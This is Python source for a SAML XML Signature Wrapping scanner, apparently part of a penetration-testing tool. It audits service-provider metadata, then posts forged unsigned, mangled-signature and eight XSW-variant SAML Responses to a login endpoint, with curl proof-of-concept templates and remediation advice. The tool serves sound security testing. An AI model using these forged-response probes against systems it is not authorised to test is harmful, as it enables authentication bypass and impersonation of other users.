def scan_saml_xsw(  # noqa: PLR0912, PLR0915 — single specialist entry point
    *,
    url: str,
    acs_url: str | None = None,
    donor_assertion: str | None = None,
    relay_state: str | None = None,
    extra_headers: dict[str, str] | None = None,
) -> SpecialistResult:
    """SAML XML Signature Wrapping detector + SP config audit.

    Args:
        url: SP base URL or metadata URL. The tool discovers metadata
            from the host and audits it before any active probing.
        acs_url: SAML AssertionConsumerService endpoint to actively
            probe. When omitted the tool will try to extract one
            from the discovered metadata; absent that, Phase 2/3
            are skipped (config audit still runs).
        donor_assertion: a SAML Response (raw XML or base64) captured
            from a legitimate flow. Required for the 8 XSW variant
            probes. When omitted Phase 3 is skipped.
        relay_state: SAML RelayState — passed through with every POST.
        extra_headers: forwarded as-is to every outbound request.

    Auto-emits findings for:
      * `WantAssertionsSigned=false` in SP metadata (high, CWE-347).
      * Weak signature/digest algorithms advertised (medium, CWE-327).
      * ACS accepts unsigned Response (critical, CWE-347).
      * ACS accepts mangled-signature Response (critical, CWE-347).
      * ACS accepts any of the 8 XSW variants (critical, CWE-347).
    """
    if not isinstance(url, str) or not url.strip():
        return SpecialistResult(status="error", error="url required")
    url = url.strip()

    base_url = _normalize_base(url)
    parsed = urlparse(base_url)
    if not parsed.netloc:
        return SpecialistResult(status="error", error="invalid url (no host)")

    headers = dict(extra_headers or {})

    # Inject auth headers from SecurityContext when present (some
    # metadata endpoints sit behind auth — e.g. internal SP portals).
    if "Authorization" not in headers and "authorization" not in {
        h.lower() for h in headers
    }:
        try:
            from strix.agents.security_context import list_auth_states

            for state in list_auth_states():
                if state.bearer:
                    headers["Authorization"] = f"Bearer {state.bearer}"
                    break
        except Exception:  # noqa: BLE001
            pass

    try:
        from strix.tools.proxy.proxy_manager import get_proxy_manager

        pm = get_proxy_manager()
    except Exception as e:  # noqa: BLE001
        return SpecialistResult(
            status="error",
            error=f"proxy_manager unavailable: {type(e).__name__}: {e}",
        )

    drafts: list[FindingDraft] = []
    evidence: list[str] = []
    emitted_count = 0
    discovered_acs: list[str] = []

    # ---------------------------------------------------------------
    # Phase 1 — SP metadata discovery + config audit
    # ---------------------------------------------------------------
    metadata_xml, metadata_source = _discover_sp_metadata(
        base_url=base_url, headers=headers, pm=pm,
    )
    if metadata_xml is not None and metadata_source is not None:
        evidence.append(f"sp_metadata_source: {metadata_source}")
        info = _parse_sp_metadata(metadata_xml)
        discovered_acs = list(info.get("acs_endpoints") or [])
        evidence.append(
            f"sp_metadata_summary: entityID={info.get('entity_id')}, "
            f"want_assertions_signed={info.get('want_assertions_signed')}, "
            f"acs_endpoints={len(discovered_acs)}"
        )
        for issue in _audit_sp_config(info=info, metadata_url=metadata_source):
            rid = _emit_finding(
                url=metadata_source,
                **issue,
            )
            if rid:
                emitted_count += 1
            drafts.append(FindingDraft(
                title=issue["title"],
                severity=issue["severity"],
                cwe=issue["cwe"],
                endpoint=metadata_source,
                category="saml_xsw",
                verification_status="verified",
                confidence=0.9,
                description=issue["description"][:8000],
            ))
    else:
        evidence.append(
            f"sp_metadata_not_found: tried {len(_METADATA_PATHS)} "
            f"well-known paths under {base_url}"
        )

    # Resolve the ACS endpoint we'll probe in Phase 2/3.
    target_acs: str | None = None
    if isinstance(acs_url, str) and acs_url.strip():
        target_acs = acs_url.strip()
        evidence.append(f"acs_source: operator_supplied ({target_acs})")
    elif discovered_acs:
        target_acs = discovered_acs[0]
        evidence.append(f"acs_source: sp_metadata ({target_acs})")

    if target_acs is None:
        # No active probing possible. Return what we have.
        try:
            from strix.agents.security_context import record_endpoint

            if metadata_source:
                record_endpoint(metadata_source, method="GET", probed_for="saml_metadata")
        except Exception:  # noqa: BLE001
            pass
        try:
            from strix.agents.decision_log import record_decision

            record_decision(
                kind="specialist_invocation", target=base_url,
                actor={"tool_name": "scan_saml_xsw"},
                input={"metadata_source": metadata_source},
                output={"findings_emitted": emitted_count, "phase_2_3_skipped": True},
            )
        except Exception:  # noqa: BLE001
            pass
        return SpecialistResult(
            status="partial" if emitted_count == 0 and metadata_xml is None else "ok",
            findings=drafts,
            evidence=evidence[:50],
            next_probes_suggested=[
                "supply `acs_url=<ACS endpoint>` to enable active "
                "unsigned-response + XSW variant probes",
                "supply `donor_assertion=<base64 or XML>` (captured "
                "from a legitimate SAML flow) to run the 8 XSW "
                "variant POSTs",
            ],
            tool_metadata={
                "metadata_source": metadata_source,
                "acs_url_probed": None,
                "discovered_acs_endpoints": discovered_acs,
                "accepted_xsw_variants": [],
                "findings_emitted_to_tracer": emitted_count,
            },
        )

    # ---------------------------------------------------------------
    # Phase 2 — active config probes against the ACS endpoint
    # ---------------------------------------------------------------

    # Probe A — fully unsigned Response.
    unsigned_resp = _post_saml(
        acs_url=target_acs,
        saml_response_xml=_build_unsigned_response(acs_url=target_acs),
        relay_state=relay_state, headers=headers, pm=pm,
    )
    verdict, reason = _classify_acs_response(resp=unsigned_resp, acs_url=target_acs)
    evidence.append(f"unsigned_probe: {verdict} ({reason})")
    if verdict == "accepted":
        rid = _emit_finding(
            url=target_acs, issue_label="acs_accepts_unsigned",
            title="SAML SP accepts unsigned Response — auth bypass (CWE-347)",
            description=(
                f"The SAML ACS endpoint at `{target_acs}` accepted a "
                f"completely unsigned SAML Response. The SP does not "
                f"enforce signature presence, let alone validity. Any "
                f"attacker who can reach the ACS authenticates as the "
                f"attacker-controlled Subject. {reason}"
            ),
            impact=(
                "Full authentication bypass. The attacker forges a SAML "
                "Response naming any victim — `admin@example.com`, "
                "`victim@example.com`, or a service account — and the "
                "SP grants a session under that identity."
            ),
            technical_analysis=(
                f"Classification: {reason}. The Response posted to "
                f"`{target_acs}` carried no `<ds:Signature>` element "
                f"and no IdP authentication context — a real SAML "
                f"library would reject in milliseconds at the SP "
                f"middleware layer."
            ),
            poc_description=(
                "Generated unsigned Response (see `_build_unsigned_response` "
                "in `strix/tools/specialist/scan_saml_xsw.py`)."
            ),
            poc_script_code=(
                f"curl -sS -i -X POST '{target_acs}' "
                f"-d 'SAMLResponse=<b64 unsigned response>' "
                f"-H 'Content-Type: application/x-www-form-urlencoded'"
            ),
            remediation_steps=(
                "1. Enforce `WantAssertionsSigned=true` AT THE SP "
                "MIDDLEWARE — don't rely solely on metadata.\n"
                "2. Reject Responses lacking a `<ds:Signature>` "
                "element before any business-logic processing.\n"
                "3. Validate the signature against the IdP's published "
                "cert; reject signatures from unknown signing keys.\n"
                "4. Verify the signed Reference URI matches the "
                "Assertion ID the SP is consuming (this also catches "
                "XSW variants 1-8 simultaneously)."
            ),
            severity="critical", cwe="CWE-347", confidence=0.95,
        )
        if rid:
            emitted_count += 1
        drafts.append(FindingDraft(
            title="SAML SP accepts unsigned Response",
            severity="critical", cwe="CWE-347",
            endpoint=target_acs, category="saml_xsw",
            verification_status="verified", confidence=0.95,
            description=reason,
        ))

    # Probe B — mangled-signature Response. Catches SPs that check
    # "signature element exists" without actually validating it.
    mangled_resp = _post_saml(
        acs_url=target_acs,
        saml_response_xml=_build_mangled_signature_response(acs_url=target_acs),
        relay_state=relay_state, headers=headers, pm=pm,
    )
    verdict, reason = _classify_acs_response(resp=mangled_resp, acs_url=target_acs)
    evidence.append(f"mangled_signature_probe: {verdict} ({reason})")
    if verdict == "accepted":
        rid = _emit_finding(
            url=target_acs, issue_label="acs_accepts_mangled_signature",
            title="SAML SP accepts Response with invalid signature (CWE-347)",
            description=(
                f"The SAML ACS endpoint at `{target_acs}` accepted a "
                f"SAML Response carrying a syntactically-present but "
                f"cryptographically-invalid `<ds:Signature>` (zero-byte "
                f"SignatureValue / DigestValue). The SP appears to "
                f"check for the *presence* of a signature element "
                f"without validating it. {reason}"
            ),
            impact=(
                "Authentication bypass via signature-validation skip. "
                "An attacker forges a signature block with bogus values "
                "and the SP grants a session anyway."
            ),
            technical_analysis=(
                f"Classification: {reason}. The signature block had "
                f"all-zero DigestValue + SignatureValue and pointed at "
                f"a Reference URI that wasn't present — a correctly "
                f"implemented validator rejects both."
            ),
            poc_description=(
                "Generated mangled-signature Response (see "
                "`_build_mangled_signature_response`)."
            ),
            poc_script_code=(
                f"curl -sS -i -X POST '{target_acs}' "
                f"-d 'SAMLResponse=<b64 mangled-sig response>' "
                f"-H 'Content-Type: application/x-www-form-urlencoded'"
            ),
            remediation_steps=(
                "1. Use a vetted SAML library (pysaml2, OneLogin's "
                "python3-saml, Shibboleth) — don't roll your own.\n"
                "2. Confirm the library is configured to actually "
                "validate the signature, not just check for presence.\n"
                "3. Add an integration test that POSTs a known-bad "
                "Response and expects 4xx."
            ),
            severity="critical", cwe="CWE-347", confidence=0.95,
        )
        if rid:
            emitted_count += 1
        drafts.append(FindingDraft(
            title="SAML SP accepts mangled-signature Response",
            severity="critical", cwe="CWE-347",
            endpoint=target_acs, category="saml_xsw",
            verification_status="verified", confidence=0.95,
            description=reason,
        ))

    # ---------------------------------------------------------------
    # Phase 3 — XSW1-8 variant probes (requires donor)
    # ---------------------------------------------------------------
    accepted_variants: list[int] = []
    if isinstance(donor_assertion, str) and donor_assertion.strip():
        donor_xml = _decode_donor(donor_assertion)
        donor_root = _parse_xml_safe(donor_xml)
        if donor_root is None or donor_root.tag != f"{{{_NS_SAMLP}}}Response":
            evidence.append(
                "donor_assertion_unusable: not a parseable samlp:Response"
            )
        else:
            for variant in range(1, 9):
                # Re-build each variant from a fresh parse since
                # _build_xsw_variant mutates the root.
                mutated = _build_xsw_variant(
                    donor_xml=donor_xml, variant=variant,
                )
                if mutated is None:
                    evidence.append(f"xsw{variant}_build_failed")
                    continue
                v_resp = _post_saml(
                    acs_url=target_acs, saml_response_xml=mutated,
                    relay_state=relay_state, headers=headers, pm=pm,
                )
                v_verdict, v_reason = _classify_acs_response(
                    resp=v_resp, acs_url=target_acs,
                )
                evidence.append(f"xsw{variant}_probe: {v_verdict} ({v_reason})")
                if v_verdict == "accepted":
                    accepted_variants.append(variant)
                    rid = _emit_finding(
                        url=target_acs,
                        issue_label=f"xsw{variant}_accepted",
                        title=f"SAML XSW variant {variant} — signature wrapping accepted (CWE-347)",
                        description=(
                            f"The SAML ACS endpoint at `{target_acs}` "
                            f"accepted XSW variant {variant} — a SAML "
                            f"Response where the signed Assertion was "
                            f"restructured so the SP processes "
                            f"attacker-controlled identity assertions "
                            f"while validating the donor's signature. "
                            f"{v_reason}"
                        ),
                        impact=(
                            "Authentication bypass via XML Signature "
                            "Wrapping. The attacker obtains any valid "
                            "signed SAML Response (e.g. their own) and "
                            "transforms it via XSW so the SP grants a "
                            "session as an arbitrary other user "
                            "(`admin`, `victim@example.com`, etc.)."
                        ),
                        technical_analysis=(
                            f"XSW variant {variant} mutation: see the "
                            f"`_build_xsw_variant` branch in "
                            f"`strix/tools/specialist/scan_saml_xsw.py`. "
                            f"The synthesised Response preserves the "
                            f"donor signature byte-for-byte but "
                            f"restructures the surrounding XML so the "
                            f"signature-verifying code-path and the "
                            f"identity-processing code-path read "
                            f"different elements. Classification: "
                            f"{v_reason}."
                        ),
                        poc_description=(
                            f"XSW{variant} mutation of the donor "
                            f"Response, base64-encoded, POSTed to "
                            f"`{target_acs}`."
                        ),
                        poc_script_code=(
                            f"# strix.tools.specialist.scan_saml_xsw._build_xsw_variant"
                            f"(donor_xml=donor, variant={variant})"
                        ),
                        remediation_steps=(
                            "1. Validate that the signed Reference URI "
                            "matches the Assertion the SP processes — "
                            "compare element identities, not just IDs. "
                            "Most XSW variants are caught by this "
                            "single check.\n"
                            "2. Reject Responses with more than one "
                            "Assertion (or one Response inside an "
                            "Object) — none of these are part of "
                            "normal SAML traffic.\n"
                            "3. Use a SAML library known to be XSW-"
                            "hardened (pysaml2 >= 7.0, python3-saml >= "
                            "1.13, modern Shibboleth).\n"
                            "4. Add CI test cases for XSW1-8 — run "
                            "`scan_saml_xsw --donor-assertion <known "
                            "good>` against staging in CI."
                        ),
                        severity="critical", cwe="CWE-347", confidence=0.95,
                    )
                    if rid:
                        emitted_count += 1
                    drafts.append(FindingDraft(
                        title=f"SAML XSW variant {variant} accepted",
                        severity="critical", cwe="CWE-347",
                        endpoint=target_acs, category="saml_xsw",
                        verification_status="verified", confidence=0.95,
                        description=v_reason,
                    ))
    else:
        evidence.append(
            "phase3_skipped: no donor_assertion supplied — XSW1-8 "
            "variants require a signed donor SAML Response"
        )

    # SecurityContext + decision_log
    try:
        from strix.agents.security_context import record_endpoint

        record_endpoint(target_acs, method="POST", probed_for="saml_xsw")
        if metadata_source:
            record_endpoint(
                metadata_source, method="GET", probed_for="saml_metadata",
            )
    except Exception:  # noqa: BLE001
        pass
    try:
        from strix.agents.decision_log import record_decision

        record_decision(
            kind="specialist_invocation", target=base_url,
            actor={"tool_name": "scan_saml_xsw"},
            input={
                "metadata_source": metadata_source,
                "acs_url": target_acs,
                "donor_provided": bool(donor_assertion),
            },
            output={
                "findings_emitted": emitted_count,
                "accepted_xsw_variants": accepted_variants,
            },
        )
    except Exception:  # noqa: BLE001
        pass

    next_probes: list[str] = []
    if drafts:
        next_probes.append(
            "rotate the SP's signing certificate and re-test — XSW "
            "findings often persist across deployments"
        )
    if not isinstance(donor_assertion, str) or not donor_assertion.strip():
        next_probes.append(
            "capture a signed SAML Response from a legitimate flow and "
            "re-run with `donor_assertion=` to test the 8 XSW variants"
        )
    if not next_probes:
        next_probes.append(
            "no SAML signature-wrapping issues detected on the standard "
            "probes; consider auditing the SP's session-binding logic "
            "(SubjectConfirmation Recipient/NotOnOrAfter enforcement)"
        )

    return SpecialistResult(
        status="ok" if drafts or metadata_xml else "partial",
        findings=drafts,
        evidence=evidence[:50],
        next_probes_suggested=next_probes,
        tool_metadata={
            "metadata_source": metadata_source,
            "acs_url_probed": target_acs,
            "discovered_acs_endpoints": discovered_acs,
            "accepted_xsw_variants": accepted_variants,
            "findings_emitted_to_tracer": emitted_count,
        },
    )
